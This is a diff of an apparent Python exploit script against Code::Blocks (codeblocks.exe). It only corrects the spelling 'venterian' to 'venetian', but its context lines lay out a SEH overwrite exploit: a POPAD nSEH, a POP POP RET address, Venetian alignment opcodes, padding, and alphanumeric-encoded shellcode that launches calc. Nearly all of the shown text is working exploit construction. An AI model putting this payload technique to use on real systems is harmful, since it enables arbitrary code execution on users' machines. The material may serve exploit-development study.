@@ -54,7 +54,7 @@ shellcode_calc += "LM6SLLJE0KK9PCEKUWKOWMCSBRO2JKPR3KO9ERC1QRL1SNN1U3H35M0AA"
 nseh = "\x61\x62" # POPAD
 seh = "\xE0\x50"  # POP POP RET sequence from codeblocks.exe
 
-venterian_alignment = (
+venetian_alignment = (
 "\x53" 					                            #push ebx
 "\x47" 					                            #align
 "\x58" 					                            #pop eax
@@ -72,7 +72,7 @@ payload  = "A" * 1982
 payload += nseh                         # POPAD
 payload += seh                          # POP POP RET
 payload += "\x47" * 10                  # padding
-payload += venterian_alignment          # venterian alignment exploit
+payload += venetian_alignment          # Venetian alignment exploit
 payload += "\x47" * 28                  # padding
 payload += shellcode_calc               # calc payload with alphamixed encoder
 payload += "D" * 10000
